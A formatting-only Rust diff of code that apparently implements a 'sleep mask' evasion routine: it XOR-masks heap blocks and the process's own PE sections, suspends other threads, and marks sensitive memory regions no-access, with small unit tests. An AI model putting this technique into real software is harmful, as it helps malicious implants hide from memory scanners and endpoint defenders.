@@ -13,8 +13,11 @@ pub unsafe fn mask_heap(h_heap: HANDLE, mask: u8) {
     let mut entry: PROCESS_HEAP_ENTRY = std::mem::zeroed();
     while HeapWalk(h_heap, &mut entry) != 0 {
         if (entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0 {
-            let data = std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
-            for b in data { *b ^= mask; }
+            let data =
+                std::slice::from_raw_parts_mut(entry.lpData as *mut u8, entry.cbData as usize);
+            for b in data {
+                *b ^= mask;
+            }
         }
     }
 }
@@ -139,12 +142,10 @@ unsafe fn mask_pe_sections_inner(image_base: *const u8, xor_key: &[u8]) {
     }
 
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = image_base
-        .offset((*dos_header).e_lfanew as isize)
+    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
         as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
     #[cfg(not(target_arch = "x86_64"))]
-    let nt_headers = image_base
-        .offset((*dos_header).e_lfanew as isize)
+    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
         as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
 
     let section_header = nt_headers
@@ -215,13 +216,13 @@ pub unsafe fn with_threads_suspended<F, R>(f: F) -> R
 where
     F: FnOnce() -> R,
 {
+    use winapi::um::handleapi::CloseHandle;
     use winapi::um::processthreadsapi::{
         GetCurrentProcessId, GetCurrentThreadId, OpenThread, ResumeThread, SuspendThread,
     };
     use winapi::um::tlhelp32::{
         CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
     };
-    use winapi::um::handleapi::CloseHandle;
     use winapi::um::winnt::THREAD_SUSPEND_RESUME;
 
     let pid = GetCurrentProcessId();
@@ -286,12 +287,10 @@ unsafe fn sleep_mask_section_ranges() -> Vec<(*mut u8, usize)> {
         return out;
     }
     #[cfg(target_arch = "x86_64")]
-    let nt_headers = image_base
-        .offset((*dos_header).e_lfanew as isize)
+    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
         as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
     #[cfg(not(target_arch = "x86_64"))]
-    let nt_headers = image_base
-        .offset((*dos_header).e_lfanew as isize)
+    let nt_headers = image_base.offset((*dos_header).e_lfanew as isize)
         as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
     let section_header = nt_headers
         .cast::<u8>()
@@ -457,7 +456,10 @@ fn sensitive_region_ranges() -> Vec<(*mut u8, usize)> {
 /// Unit-testable: after mask enter, section protect intent is NOACCESS (constant + helper present).
 #[cfg(test)]
 mod sleep_noaccess_tests {
-    use super::{PAGE_NOACCESS, PAGE_READWRITE, sensitive_region_ranges, register_sensitive_region, unregister_sensitive_region};
+    use super::{
+        register_sensitive_region, sensitive_region_ranges, unregister_sensitive_region,
+        PAGE_NOACCESS, PAGE_READWRITE,
+    };
 
     #[test]
     fn page_noaccess_constant_is_windows_noaccess() {
@@ -470,7 +472,9 @@ mod sleep_noaccess_tests {
         let mut buf = [0u8; 16];
         let id = register_sensitive_region(buf.as_mut_ptr(), buf.len(), 9);
         let ranges = sensitive_region_ranges();
-        assert!(ranges.iter().any(|(p, l)| *p == buf.as_mut_ptr() && *l == 16));
+        assert!(ranges
+            .iter()
+            .any(|(p, l)| *p == buf.as_mut_ptr() && *l == 16));
         unregister_sensitive_region(id);
     }
 }
